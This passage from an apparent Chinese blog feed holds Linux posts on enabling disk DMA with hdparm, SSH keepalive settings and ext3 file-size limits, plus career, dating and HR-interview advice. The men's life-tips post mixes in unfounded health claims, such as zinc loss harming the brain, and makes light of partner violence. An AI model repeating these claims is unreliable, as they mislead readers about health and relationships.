通过上面的命令，已经知道现在32位I/O和DMA是关闭的，可以分别用下面的命令将其打开：  </p><p>[root@anima lwg]# /sbin/hdparm -c 1 /dev/hda    （打开32位I/O）  </p><p>/dev/hda:<br> setting 32-bit IO_support flag to 1<br> IO_support   =  1 (32-bit)<br>[root@anima lwg]# /sbin/hdparm -d 1 /dev/hda    （打开DMA）  </p><p>/dev/hda:<br> setting using_dma to 1 (on)<br> using_dma    =  1 (on)<br>[root@anima lwg]#  </p><p>　　然后使用下面的命令使设置生效：  </p><p>[root@anima lwg]# /sbin/hdparm -k 1 /dev/hda  </p><p>/dev/hda:<br> setting keep_settings to 1 (on)<br> keepsettings =  1 (on)<br>[root@anima lwg]#  </p><p>好啦！现在再查看一下驱动器的I/O情况：  </p><p>[root@anima lwg]# /sbin/hdparm -t /dev/hda  </p><p>/dev/hda:<br> Timing buffered disk reads:  116 MB in  3.03 seconds =  38.34 MB/sec<br>[root@anima lwg]#  </p><p>可以看到，现在系统的I/O性能提高了很多。  </p><p>但是，上面的设置只是对当前的系统有效，当再次重启系统时，又得重新设置了。<br>如果要使每次系统启动时都打开DMA，可以在/etc/rc.d/rc.local文件中添加上面的命令来实现：  </p><p>[root@anima lwg]# echo “/sbin/hdparm -c 1 -d 1 -k 1 /dev/hda” &gt;&gt; /etc/rc.d/rc.local<br>[root@anima lwg]#  </p><p>-------------------------------------------------------------------------------------------------------------------------<br>对于SATA硬盘：<br>-------------------------------------------------------------------------------------------------------------------------  </p><p>[root@anima lwg]# /sbin/hdparm -t /dev/sda  </p><p>/dev/sda:<br> Timing buffered disk reads:  100 MB in  3.02 seconds =  33.11 MB/sec<br>[root@anima lwg]# /sbin/hdparm -c 1 -d 1 /dev/sda  </p><p>/dev/sda:<br> setting 32-bit IO_support flag to 1<br> HDIO_SET_32BIT failed: Invalid argument<br> setting using_dma to 1 (on)<br> HDIO_SET_DMA failed: Inappropriate ioctl for device<br> IO_support   =  0 (default 16-bit)<br>[root@anima lwg]#  </p><p>查看控制器：<br>---------------------------  </p><p>[root@anima lwg]# /sbin/lspci -v | grep IDE<br>00:0f.0 IDE interface: VIA Technologies, Inc. VIA VT6420 SATA RAID Controller (rev 80) (prog-if 8f [Master SecP SecO PriP PriO])<br>00:0f.1 IDE interface: VIA Technologies, Inc. VT82C586A/B/VT82C686/A/B/VT823x/A/C PIPC Bus Master IDE (rev 06) (prog-if 8a [Master SecP PriP])<br>[root@anima lwg]#  </p><p>如果不打开内核的SATA选项，则不能使用SATA的DMA模式，否则使用/sbin/hdparm命令时会出错。<br>查看内核配置：  </p><p>[root@anima lwg]# cat /boot/config-2.6.9-42.0.10.EL | grep ATA<br># CONFIG_X86_MCE_NONFATAL is not set<br># ATA/ATAPI/MFM/RLL support<br># CONFIG_BLK_DEV_IDE_SATA is not set<br>CONFIG_SCSI_SATA=y<br>CONFIG_SCSI_SATA_AHCI=m<br>CONFIG_SCSI_SATA_SVW=m<br>CONFIG_SCSI_ATA_PIIX=m<br>CONFIG_SCSI_SATA_MV=m<br>CONFIG_SCSI_SATA_NV=m<br>CONFIG_SCSI_SATA_QSTOR=m<br>CONFIG_SCSI_SATA_PROMISE=m<br>CONFIG_SCSI_SATA_SX4=m<br>CONFIG_SCSI_SATA_SIL=m<br>CONFIG_SCSI_SATA_SIL24=m<br>CONFIG_SCSI_SATA_SIS=m<br>CONFIG_SCSI_SATA_ULI=m<br>CONFIG_SCSI_SATA_VIA=m<br>CONFIG_SCSI_SATA_VITESSE=m<br>CONFIG_SCSI_SATA_INTEL_COMBINED=y<br># CONFIG_SCSI_EATA is not set<br># CONFIG_SCSI_EATA_PIO is not set<br># CONFIG_ATALK is not set<br>CONFIG_USB_STORAGE_DATAFAB=y<br># CONFIG_INFINIBAND_IPOIB_DEBUG_DATA is not set<br># CONFIG_ATARI_PARTITION is not set<br>[root@anima lwg]#  </p><p>需要打开内核的如下两个选项：<br>CONFIG_SCSI_SATA=y<br>CONFIG_SCSI_ATA_PIIX=y  </p><p>重新编译内核。  </p><p>如果你的SATA为启动盘的话，可能需要把原来/boot/grub/grub.conf 和 /etc/fstab 中的hda更改为sda，其他的驱动器名称也可能需要进行更改。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>保持linux下保持ssh不断线</title>
      <link href="/2009/12/19/keep-your-linux-based-ssh-constant/"/>
      <url>/2009/12/19/keep-your-linux-based-ssh-constant/</url>
      <content type="html"><![CDATA[<p>使用ssh连接远程服务器的时候，在网络质量不太好的情况下，如果长时间没有键盘输入，ssh连接有可能中断。正在执行的程序和vim等缓冲区数据都会丢失。<br>在windows下使用SecureCRT可以设置session的noop属性来保持连接。<br>在linux下要保持连接，可以使用-o的一个参数ServerAliveInterval来设置一个防止超时的时间。<br>代码看起来象这样</p><blockquote><p>ssh -o ServerAliveInterval=60 x.x.x.x</p></blockquote><p>如果要让所有的ssh连接自动加上此属性，可以修改 ~/.ssh/config 文件添加</p><blockquote><p>Host *<br>Protocol 2<br>ServerAliveInterval 30</p></blockquote><p>当然，只这只能解决网络延时大和不稳定的情况，如果网络出现故障，数据还是容易丢失。因此，远程操作最好还是在screen中执行为好。</p><p>最近工作时经常要同时维护 3 台 Ubuntu 的主机，但当 SSH Client 窗口在几分钟没有键盘操作的时候，会话就会超时断线，特别对于 SFTP 管理时会更加烦躁 :(</p><p>找了一些关于 SSH Server 的资料，发现通过修改 sshd 的配置文件，能够让 SSH Server 发送“心跳”信号来维持持续连接，下面是设置的内容</p><p>打开服务器 /etc/ssh/sshd_config，我在最后增加一行</p><p>ClientAliveInterval 60</p><p>ClientAliveCountMax 1</p><p>这 样，SSH Server 每 60 秒就会自动发送一个信号给 Client，而等待 Client 回应，（注意：是服务器发心跳信号，不是客户端，这个有别于一些 FTP Client 发送的 KeepAlives 信号哦～～～），如果客户端没有回应，会记录下来直到记录数超过 ClientAliveCountMax 的值时，才会断开连接。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ext3 格式，单文件最大是多少呢？</title>
      <link href="/2009/12/19/ext3-format-what-is-the-largest-single-file/"/>
      <url>/2009/12/19/ext3-format-what-is-the-largest-single-file/</url>
      <content type="html"><![CDATA[<p>根据inode的格式来看(12个直接块指针,1个间接块指针,1个二次间接块指针,1个三次间接块指针),假设磁盘块尺寸为n的话,单个文件尺寸应该是:</p><p>12*n + (1/4)*n^2 + (1/16)*n^3 + (1/64)*n^4</p><p>磁盘块为1K字节的话,文件最大16G</p><p>计算方式：</p><p>表 1. 各种数据块对应的文件寻址范围</p><p>块大小</p><p>直接寻址</p><p>间接寻址</p><p>二次间接寻址</p><p>三次间接寻址</p><p>1024</p><p>12KB</p><p>268KB</p><p>64.26MB</p><p>16.06GB</p><p>2048</p><p>24KB</p><p>1.02MB</p><p>513.02MB</p><p>265.5GB</p><p>4096</p><p>48KB</p><p>4.04MB</p><p>4GB</p><p>~ 4TB</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>5招让你“卖”个好价钱</title>
      <link href="/2009/12/13/let-you-sell-a-good-price/"/>
      <url>/2009/12/13/let-you-sell-a-good-price/</url>
      <content type="html"><![CDATA[<p>是什么造成了这样的差异？问题的关键还在于他们中晋升较快的那个，能够主动并善于进行职业能力储备，增加职业生涯的本钱。在本期，资深的人资管理专家、104人力银行人资学院事业处副总经理陈志钰先生就“如何储备能量，增加职业生涯的本钱”与读者进行分享。</p><p>什么是你的职涯“本钱”</p><p>所谓职业生涯的本钱，简单来说，必须涵盖三个方面，一是充分的能力，包括专业技能、管理知识的储备等；二是态度，即工作态度及风格是否契合你所希望就职公司的文化，开阔的视野、兼容并包的心胸、善于学习及适应改变的能力，都会为你的职场加分，为未来的职业发展创造无限可能；三是诚信，GE前总裁杰克·韦尔奇曾表示“诚信，这是我们的最高价值，具有至高无上的重要性”，确立并保持诚信等为人处事的基本原则，是在职场立于不败之地的关键。</p><p>当然，这一切的前提必须是能清晰的认识自我，了解自己希望及能够从事的职业方向。只有做到这些，才能时刻保持并提升自己的职场竞争力，使职业生涯呈现上升的态势。</p><p>如何在职场做加法</p><p>那么，如何在自己的职涯规划中不断做加法？如何让自己随着时间、经验的累积变得更有价值，更加抢手？陈先生认为，关键要做到以下5个方面：</p><p>自我剖析———认识自己</p><p>很多人都不能清醒的认识自己，了解自己的优势是什么，并据此思考下一步该往哪里走。例如在考大学时，很多人会根据目前社会上所谓的热门专业来报读，而不是想想做什么更符合自己的兴趣，结果在就业时就会发现自己面临许多棘手的问题。一旦盲从、缺少目标、随遇而安成为职业生涯中的常态，不断的自我加分必然会成为空谈。</p><p>所以，正确的做法应该是评估自己的优势，并分析怎样的职业状态才能充分发挥自身的优势，降低劣势。自我认识及评估是一个不断延续的过程，可以通过参加网上提供的职业测评，或者经常与老师、朋友、家人、主管等进行讨论来完成。</p><p>作时间的主人———善用时间</p><p>上帝对每个人最公平的地方就是时间，每个人每天都拥有24小时。聪明的善用时间安排，让这24小时发挥出最大功效，就成为个人“与众不同”的关键。</p><p>时间管理是一门很大的学问。首要的一点就是充分利用每一秒可利用的时间来自我增值。在日本的地铁上，常常能够看到的一幕就是人手一本书，或是专业书籍，或是管理类书籍，利用每段空闲进行学习已经成为他们的习惯。其次是合理安排，制定完善的、合理的工作计划。例如如果每天能够早起一会，提前到公司，就能够有更多的时间去思考和安排一天的事情，也不用担心因为完不成工作而总在加班。</p><p>敢于承担责任———多做多问</p><p>古话有云：吃亏就是占便宜。这句话同样适用于职场，多去承担责任，并在实际运用中充实自己，对于个人的职涯发展是很重要的。这里必须谈到很多人在认识上的一个误区———认为自我增值就是多参加培训，多拿证书。但事实是.</p><p>陈先生表示，在他多年从事HR管理的工作中发现，很多人在简历中写得很漂亮，但当他用行为面谈法进行面试时，却发现这些求职者往往答非所问，缺少实际导入执行的经验，常常以为在讲座上听到或者在书上看到的就是自己的知识，事实上，这两者之间有很大的差距。</p><p>可见，HR更青睐的是个人实务操作和运用的能力，即使通过培训而了解到某项技能，也只有通过在实际工作中的检验才能转化成自我能力。所以建议职场人士应该把握每一个学习的机会，敢于尝试，对于不懂的勇于询问，积累实务操作经验。</p><p>做自己的假想敌———不要和别人比较</p><p>世上没有绝对的公平，过多的和别人比较，常常会使得自己处于不平衡的心态中，而受到这种不愉快心情的影响，不仅感受不到工作的快乐，使自己缺少成就感，也会局限和阻碍个人的发展。</p><p>所以，正确的做法应该是和自己比较：设定目标，然后评估自己有没有达到预先设定的目标或规划，看自己今天是否比昨天更进步，明天会不会比今天更进一步。</p><p>直面挑战———拒绝频繁跳槽</p><p>任何职业都需要一定量的积淀才能有一个质的飞跃，如果没有2－3年的积累，很难对一份工作有深入的理解和把握，频繁的跳槽不仅让你缺少职业储备，也会成为HR心中的“扣分”项。</p><p>那该如何区分有益的和无益的跳槽呢？陈先生表示，关键还在于跳槽的动机———不是因为现在的工作不好、不顺心就决定跳槽，而是看有没有一份更好的机会在等待你。</p><p>工作没有100％的如意，如果因为不好就换、就逃避，只会影响个人职业生涯的连续性和经验的沉淀。只有主动面对职业过程中遇到的挑战，学会适应环境，克服困难，才能最终做到待价而沽，积累跳槽的本钱。</p><p>相关链接1：</p><p>详解职场潜规则，顺势处理人际关系</p><p>潜规则是企业文化中最为根深蒂固的一个组成，它构成了企业内部事务处理与人际关系的基本准则，但是这些准则的相关条款，却长期以来不为人知。</p><p>自从吴思的著作《潜规则—中国历史中的真实游戏》面世以来，“潜规则”一词逐渐流行。“潜规则”是指就是“暗规则”，是一种区别于表面规则的规则，也是一种不成文的规则，在操作时至可意会，无需言传。有一种现象，现在是、以前是，并且此后相当长的时期内仍然是我们主要关注的重点，那就是企业内部秘而不宣的潜规则。</p><p>潜规则是企业文化中最为根深蒂固的一个组成，它构成了企业内部事务处理与人际关系的基本准则，但是这些准则的相关条款，却长期以来不为人知。有一种态度，或者说是一种认知思想，从根本上不承认这种潜规则的存在价值，这种思想下的企业内部运行，无异于在一团漆黑的世界中阔步行进，其危险是可想而知的。</p><p>在职场中运行的潜规则</p><p>据调查，受访者普遍认为潜规则主要作用在企业的“内部管理”、“薪酬福利”和“人际关系”三方面。职场潜规则是企业内只可意会不可言传的运行规则，它引导甚至制约企业员工的言行和价值判断。</p><p>调查发现，75.5%的人表示“企业不会允许夫妻在同一公司工作”，63.1%的人认为“销售是公司最强势的部门，销售的意见和要求最受到重视”。</p><p>职场中，最主流的潜规则是“老板说了算”，97.3%的人表示“企业里个人的前途首先取决于老板的喜恶而不是业绩”。90.2%的受访者说“公司里只可暗斗，恩怨不能放在台面上”。88.3%的人说“企业里完全不存在人人平等，同等职位男性比女性收入高”，85.1%的人表示“企业里面有派系，站对队伍比做好事情重要得多”……</p><p>近80%的人对潜规则不够了解</p><p>在职场中，员工常常感到，有一种无形的力量在左右着自己的方向，却又触摸不着，琢磨不透。调查显示，没有人声称对企业潜规则百分之百地了解，游刃有余地运用，只有20%的人觉得自己比较了解企业的潜规则，能适应企业的潜规则，近80%的人认为自己对潜规则不够了解。其中，45.8%的人认为对潜规则一知半解，27.1%的人对企业潜规则知之甚少，无法猜透，7.6%的人对企业潜规则毫不了解，无从把握。</p><p>职场潜规则不可回避</p><p>职业顾问指出，潜规则的客观存在是不可回避的。一些潜规则因企业文化、领导人的不同而大相径庭。比如日韩企业相对偏重员工的合作和忍让，欧美企业鼓励个人能力的发挥和相互竞争。还有一些潜规则是职场中约定俗成的，比如越级汇报的下属在哪里都不会被容忍，员工加班后休假的安排必须以不影响工作任务为前提。</p><p>潜规则的最大特性是不稳定，它主要伴随着企业高层管理者的管理特性而形成。如果老板对成本控制比较敏感，那么公司就会以“成本优先”作为管理和考核标准;如果老板喜欢独断，那么公司内部就比较崇尚遵从。所以对企业而言，需通过持续有效力的管理制度，使潜规则帮助完善现有的沉稳制度，使之逐步转变为显性规则，而作为员工，需深入了解企业文化及其背景下的潜规则，同时避免那些和社会法律伦理相悖的“灰色规则”，减少职业风险，学会善用潜规则，为自己职业发展创造良好环境。</p><p>潜规则是企业内部的客观存在，是组织系统自身的固有规律，是系统推进机制的功能性损耗，是系统自然衍生并不断提高的熵值体现，无论它在不同时期的表现是何等的不同，也无论在不同的企业中潜规则的内容有何区别，但，它的客观性不会改变。</p><p>唯一能够改变的，只是我们的思想背景，做为企业这个社会性组织系统内部成员的不同思想，所看到的潜规则是不同的。而事实上，潜规则就是潜规则，它从来没有发生过变化。处理好了，它就成了你奋然前行和升华的平台，处理的糟糕就成了你马失前蹄的泥潭!</p><p>**职场风格决定你的作为  </p><p>**小张某民营企业工作已经2年了，每天兢兢业业，任劳任怨。工作时间把领导安排的事情尽量按时按质完成，下了班就象个隐居的贤人，一头扎进自己的魔幻的游戏世界。平时他也很少和上司沟通，也很少提意见，既不攻击谁，也不争斗什么，安然世外的超然一度让他活的很是自在。当一天公司人力资源部交给他一份辞退交接通知时，他一时间懵了：简直不敢相信这是真的?“我没犯什么错误啊，凭什么开除我?”，他失控的大喊道!  </p><p>至于小张为何为形成这样的个性，是性格造成的还是遇到过职场的挫折变动愚钝起来我们暂时不去探讨。单单就他这种性格为何会失败我们分析一下，我相信象小张这样生活的年轻人一定为数不少。人在职场不管你的情商和智商如何，都应该有个做事的原则和方法，这个方法可以有自己的风格和特色，但要以适应现代企业发展的一般规律为前提，否则只有不断的失败和碰壁。所以说你的职场风格不能空白，你应该积极的搭建自己的风格，找到自己的成功之路。  </p><p>谭一平先生曾经写过一本书《狐狸信条和穿山甲法则》，曾经在职场引起极大的轰动，笔者也是热衷的读者之一，其很多观点值得借鉴和反思。  </p><p>谭先生的观点很有见地：一个人如果象穿山甲只知道埋头打洞，外面世界很少管的话，那就注定他会一事无成。如果只知道埋头苦干，既不动脑子想问题，也不会想问题，没有一点灵气，领导肯定会不喜欢，甚至也可以认为是愚钝和不敬业，这样的员工即使不被炒鱿鱼，也只能担当一个无足轻重的配角而已。无论是被领导认为是没有方法、没有思路还是没有激情都是致命的空挡，只有失败一条路可走。可能他和刺猬相比会有些优势，因为刺猬更是无所作为，只知道用那种悲观的方式负隅顽抗的保护自己，甚至下山都是不争气的滚着走。  </p><p>相反如果人在职场学的是狐狸似的生存哲学，那和穿山甲走向失败的结局应该是殊途同归的。整天不踏踏实实工作，只是挖空心思苦心钻营，总是妄图找到一个肥缺和捷径，结果是做事浮夸善于走形式，也难以在企业立足，所以说这条路也是走不通的。  </p><p>职场专家建议我们，人在职场既要学会穿山甲的踏实肯干、善于积累、立足现实的精神;也要反应敏捷、洞察全局、善于思考的良好习惯。所以我建议学习雄鹰的风格，兼容高空翱翔和低空捕物的本领。既有高屋建瓴的视野和一览众山小的技能，同时更具有低空甚至陆地厮杀捕物的绝招，所以使得他成了除了蜗牛唯一能上金字塔顶端的英雄，其气概让我们为止折服，所以形容人窝囊和猥琐的没有用雄鹰做比喻的，让我们学习雄鹰，看的更高，做的更好!  </p><p>**相关链接2：  </p><p>职业生涯12个致命想法**  </p><p>这种人虽然聪明、有历练，但是一旦被提拔，反而毫无自信，觉得自己不胜任。此外，他没有往上爬的野心，总觉得自己的职位已经太高，或许低一两级可能还比较适合。  </p><p><strong>1、总觉得自己不够好</strong>  </p><p>这种人虽然聪明、有历练，但是一旦被提拔，反而毫无自信，觉得自己不胜任。此外，他没有往上爬的野心，总觉得自己的职位已经太高，或许低一两级可能还比较适合。  </p><p>这种自我破坏与自我限制的行为，有时候是无意识的。但是，身为企业中、高级主管，这种无意识的行为却会让企业付出很大的代价。  </p><p><strong>2、非黑即白看世界</strong>  </p><p>这种人眼中的世界非黑即白。他们相信，一切事物都应该像有标准答案的考试一样，客观地评定优劣。他们总是觉得自己在捍卫信念、坚持原则。但是，这些原则，别人可能完全不以为意。结果，这种人总是孤军奋战，常打败仗。  </p><p><strong>3、无止境地追求卓越</strong>  </p><p>这种人要求自己是英雄，也严格要求别人达到他的水准。在工作上，他们要求自己与部属“更多、更快、更好”。结果，部属被拖得精疲力竭，纷纷“跳船求生”，留下来的人则更累。结果离职率节节升高，造成企业的负担。  </p><p>这种人适合独立工作，如果当主管，必须雇用一位专门人员，当他对部属要求太多时，大胆不讳地提醒他。  </p><p><strong>4、无条件地回避冲突</strong>  </p><p>这种人一般会不惜一切代价，避免冲突。其实，不同意见与冲突，反而可以激发活力与创造力。一位本来应当为部属据理力争的主管，为了回避冲突，可能被部属或其他部门看扁。为了维持和平，他们压抑感情，结果，他们严重缺乏面对冲突、解决冲突的能力。到最后，这种解决冲突的无能，蔓延到婚姻、亲子、手足与友谊关系。  </p><p><strong>5、强横压制反对者</strong>  </p><p>他们言行强硬，毫不留情，就像一部推土机，凡阻挡去路者，一律铲平，因为横冲直撞，攻击性过强，不懂得绕道的技巧，结果可能伤害到自己的事业生涯。  </p><p><strong>6、天生喜欢引人侧目</strong>  </p><p>这种人为了某种理想，奋斗不懈。在稳定的社会或企业中，他们总是很快表明立场，觉得妥协就是屈辱，如果没有人注意他，他们会变本加厉，直到有人注意为止。  </p><p><strong>7、过度自信，急于成功</strong>  </p><p>这种人过度自信，急于成功。他们不切实际，找工作时，不是龙头企业则免谈，否则就自立门户。进入大企业工作，他们大多自告奋勇，要求负责超过自己能力的工作。结果任务未达成，仍不会停止挥棒，反而想用更高的功绩来弥补之前的承诺，结果成了常败将军。  </p><p>这种人大多是心理上缺乏肯定，必须找出心理根源，才能停止不断想挥棒的行为。除此之外，也必须强制自己“不作为，不行动”。  </p><p><strong>8、被困难“绳捆索绑”</strong>  </p><p>他们是典型的悲观论者，喜欢杞人忧天。采取行动之前，他会想像一切负面的结果，感到焦虑不安。这种人担任主管，会遇事拖延，按兵不动。因为太在意羞愧感，甚至担心部属会出状况，让他难堪。  </p><p>这种人必须训练自己，在考虑任何事情时，必须控制心中的恐惧，让自己变得更有行动力。职场中最有效地生存法!  </p><p><strong>9、疏于换位思考</strong>  </p><p>这种人完全不了解人性，很难了解恐惧、爱、愤怒、贪婪及怜悯等情绪。他们在通电话时，通常连招呼都不打，直接切入正题，缺乏将心比心的能力，他们想把情绪因素排除在决策过程之外。  </p><p>这种人必须为自己做一次“情绪稽查”，了解自己对哪些感觉较敏感;问朋友或同事，是否发现你忽略别人的感受，搜集自己行为模式的实际案例，重新演练整个情境，改变行为。  </p><p><strong>10、不懂装懂</strong>  </p><p>工作中那种不懂装懂的人，喜欢说：“这些工作真无聊。”但他们内心的真正感觉是：“我做不好任何工作。”他们希望年纪轻轻就功成名就，但是他们又不喜欢学习、求助或征询意见，因为这样会被人以为他们“不胜任”，所以他们只好装懂。而且，他们要求完美却又严重拖延，导致工作严重瘫痪。  </p><p><strong>11、管不住嘴巴</strong>  </p><p>有的人往往不知道，有些话题可以公开交谈，而有些内容 是只能私下说。这些人通常都是好人，没有心机，但在讲究组织层级的企业，这种管不住嘴巴的人，只会断送事业生涯。  </p><p>他们必须随时为自己竖立警告标示，提醒自己什么可以说，什么不能说。什么样的MM最好找工作….  </p><p>12.我的路到底对不对?  </p><p>这种人总是觉得自己失去了职业生涯的方向。“我走的路到底对不对?”他们总是这样怀疑。他们觉得自己的角色可有可无，跟不上别人，也没有归属感。</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>男人必看的领悟,很经典</title>
      <link href="/2009/12/13/a-man-must-see-a-classic/"/>
      <url>/2009/12/13/a-man-must-see-a-classic/</url>
      <content type="html"><![CDATA[<p>男人必看的领悟        关于健康类的领悟:健康是男人的头等大事情,因此我就先讨论这个问题。</p><p>1、能不抽烟最好不抽,它或许可以帮助你吸引一些女生,但不抽绝不会招来厌烦,表现男子气概的途径有很多,没必要拿健康做赌注,都戒了吧弟弟哥哥们!</p><p>2、尽量少看黄片,每周也控制自己和GF的MLOVE次数,别以为自己是战神。正常的男人即使是单身,也不会成天迷恋黄片。而每次你SY后都会有大量锌元素流失,此元素与你大脑活动有密切联系。</p><p>3、坚持做运动,去不了健身中心也没关系,在家也可以嘛!俯卧撑可以锻炼你的胸肌和腹肌,请记住游泳圈是成功人事或者你单位领导才有资格拥有的奢侈品。</p><p>4、每天早上一杯水,预防胆结石头。睡前一小时不要喝水,否则会过早出现眼袋。(书上都这么说,大家照做啦)</p><p>5、不要以为你是个男人,就不需要保养。至少饮食方面不能太随便,多吃番茄,海产品,韭菜,香蕉,都是对男健康有益处的食物。</p><p>6、学会微笑,以后在很多场合都用得上它。如何让微笑好看,首先你得拥有健康的牙齿。如何保证牙齿健康,一,早晚,饭后刷牙;二,每年去探望一次牙科医生;三,少管闲事。</p><p>关于事业的领悟: </p><pre><code>事业是一个男人存在这个社会的身份象征哦,因此我们每个哥哥弟弟都要奋发起来,别等到了后悔的那天!大家继续仔细看领悟,一定要好好看。</code></pre><p>1、男人一定要给自己定目标,一年,两年,五年,也许你出生不如别人好,通过努力,往往可以改变命运。破罐子破摔只能和懦弱做朋友。</p><p>2、少玩游戏,这不是韩国,你打不出房子车子还有女人。进了大学,就进了社会,进了社会,就进了黑暗,这是场马拉松。现在一个砖头抛上去,砸下来7,8个都玩过传奇,现在的你是否该有点打算。</p><p>3、拿出极限,为工作尽力而为。你要想的是成功,而不是失败。所以面对困难首先就是拿出信心。除了你心爱女人的鼓励,这应该是最有用的东西。</p><p>4、每天知道自己要干什么,公司的座谈会的确可以帮你磨嘴皮子,夜深人静,问问自己,将来的打算,并朝着那个方向去实现。</p><p>5、空闲时间不要全拿去上网、喝酒吃饭,读点文学作品,学习一些经营流程,管理规范,国际时事,法律常识。这能保证你在任何<strong> </strong>都有谈资。</p><p>6、学会察言观色,不要意气用事,否则会有许多不必要的麻烦。要做一件事,成功之前,没必要告诉其他人,成功之后,和他们分享快乐。公司的东西不要带回家,即使有小便宜,也别参与,在你成为领导前,也别指责,这是你管不到的。</p><p>7、打牌和麻将可有可无,那不是年轻人该干的,除非工作需要,否则不要培养这种兴趣。当你看见GF坐在赌桌面前聚精会神的呐喊着某张牌时,你是什么感觉?</p><p>8、力求上进的人,不要总想着靠谁谁,人都是自私的,自己才是最靠得住的人。如果考公务员,要有十足的心理准备。早点开始托关系吧,还不见得一定就有收效。</p><p>关于爱情的领悟:</p><pre><code>爱情这个话题我想一定要严肃对待才能完全感觉真正意义上的神圣</code></pre><p>1、找女朋友外表是第一关,但要了解她的品行之后再做打算也不迟。</p><p>2、别把两个人的生活绞在一起,空间才是爱情的长寿药。不要经常吃醋,谁都有异性朋友,该吃的时候才吃,并且让她知道。善待她的朋友,即使她讨厌的人,你也没资格说坏话,你要做的,就是静静的听她倾诉。适当给她安慰。</p><p>3、珍惜身边人,不要见异思迁,大家都需要安定。即使对方比你GF漂亮10倍,还主动靠近你,给你暗号,请严肃的告诉她,你有女朋友!这点请诸位一定要监守住哦,假如有被攻陷阵地的请买块豆腐撞死!!</p><p>4、她开始管你的生活,你的钱,对你唠叨,频繁发消息询问你的位置。别担心,她只是把自己交给了你,害怕失去你。发生口角后,别关机,也别在街上和其他异性闲逛,那只能使矛盾激化。</p><p>5、别总是让她打电话来,她也需要被重视的感觉。别偷看她的隐私,不要去猜测,在一起是缘分,离开也是缘分。把她介绍给你最好的朋友,包括异性朋友。</p><p>6、有男友的女人不要碰,即便你想onenightstand也要做好心理准备。后果同上,严重时会出现体肤之痛。朋友的女人不要碰,无论是现在的还是曾经的,后果同上。要知道,男人经营自己就像经营一个公司,要树立品牌文化。想问为什么的朋友请先做个你是受害者的假设。</p><p>7、博爱的女人不要碰,往往这种女人连自己要什么都不知道,我想没人愿意和若干成年男性分享自己的爱。天作孽,犹可活,自作孽,不可活。没主见,不上进,懒惰的女人不要碰。就算你有钱,你有的是钱,最终你也会厌烦其中。何况不见得她们个个都是花瓶,何况你还有审美疲劳。</p><p>8、欺负她时,请带上套子,如不习惯,请自行解决,直到无法忍受为止,除非自己能很好的控制体外排精,否则就泼自己一身冷水。流产很痛苦,大家都不是女人,体会不到的那种痛苦的!</p><p>9、如果GF要跟你吵,尽量克制,不能避免时,跟她吵,吵架是最好的交流方式。你们互相可以得到心里渴望已久的答案。但别带脏字,别把对方的亲戚带出来,最后尽量妥协,有些事,只能暂时妥协。不要把问题留过夜。有时候遭受到暴力袭击后,也一定要忍,就当作防暴演习了,相信她打不坏你的。</p><p>10、当她不再爱你的时候,无论你有多想她也别打电话告诉她,因为有些人会记住第一个,而有些人只会记住上一个。</p><p>关于朋友间的领悟:</p><pre><code>朋友认识了很多,自己也感受到了许多!</code></pre><p>1、好朋友里面,一定要培养出一个知己,不要以为你有多么八面玲珑,到处是朋友,最后真心对你的,只有一个,相信我。</p><p>2、你的朋友最好以你自己为中心发散,允许少数支点连接,千万不要把朋友圈变成密不透风的多边型,你要为自己留底牌。</p><p>3、朋友圈里的你,平时都很忍让,请注意适当拿出你的主见。反之,不要太计较。不喜欢的人少接触,但别在背后说坏话,说是非之人,必定是是非之人,谨记,祸从口出。</p><p>4、大家都年轻,没什么钱,不用太在意谁谁又穿AD,NIKE,尊重每一个人,包括为你擦鞋的,卖报的,环卫工人…等等。</p><p>5、朋友之间不要合作做生意,或者办公司。麻烦会接踵而来。你要减轻负担,减小风险,可以,找陌生人。</p><p>6、朋友之间发生争执,不要次次都是忍让,每个人都有坚持自己的权利,让他们知道你的想法,你所坚持的。没关系,不出两天,你们又是好朋友。说该说的,不说不该说的。对朋友,也应当有所保留。</p><p>7、交朋友要有耐心和毅力,就好象我在整理这篇博文一样,真不知道有几个人能耐心的看完。这些感悟真的是值得男人分享的哦!</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>五年HR招聘与面试的体会</title>
      <link href="/2009/12/13/five-years-experience-in-hr-recruitment-and-interview/"/>
      <url>/2009/12/13/five-years-experience-in-hr-recruitment-and-interview/</url>
      <content type="html"><![CDATA[<p>做HR专职招聘也有好几年了，最近感觉这个话题越来越热，因此也开一帖，从HR的角度谈些有关招聘面试的问题，也尽自己的能力给有这方面需要的版友们些建议，回答大家的问题，抛砖引玉，与大家交流。</p><p>第一个问题，面试中你的角色　</p><p>　　招聘方和应聘方始终是一对矛盾，这毫无疑问，但这两者又何尝不是合作关系呢？试想有哪个做招聘的不希望又快又准得给自己的公司找到合适的人选，又有哪个应聘者不希望能尽快通过面试获得工作机会完成自己职业生涯的又一次跃进呢？所以，作为应聘者的我们千万不要从一开始就觉得HR是站在你的对立面的，如果你站错了队伍，你的面试基本上也就结束了。因为你将竭尽所能得去回避自身存在的、你认为可能会对工作有所影响的问题，而不是将自己的能力展现出来，所以在面试中最重要的工作是表现，而不是回避（To Show not to cover!）</p><p>　　绝大多数应聘者在面试之前会做准备，看很多面试经验，我也看（HR也不傻，当然琢磨对方会怎么对付面试，呵呵）。这些所谓面经中有一条很重要的就是要你去弥补自己的短处，其实这是一个很大的误区。举例来说，我面试的很多应届毕业生跟我大谈自己的工作经验，甚至在哪家打字复印店打过字都说得像个项目管理工程；反过来，那些大专中专毕业，工作两三年，面试始终喜欢说自己自考本科在读，夜大在上，很快就要拿到<strong>大学</strong>文凭……实际上，这些基本上都是无用功，想想吧，公司为什么让你来面试？如果我需要一个有工作经验的，看了你应届毕业生的简历，我要你来面试干什么？我要找个学历高的，这年头，本科生硕士生满天飞，我约你来面试那肯定是我时间多的没地方打发了！</p><p>　　所以，面试中最重要的就是表现你的优势，而不是弥补你的弱点，因为公司用人，只用人的长处，不是找三好学生，不是样样都优秀才算<a href="http://www.21itjob.com/job/default.aspx" target="_blank" rel="noopener">人才</a>！</p><p>第二个问题，展现什么样的能力</p><p>　　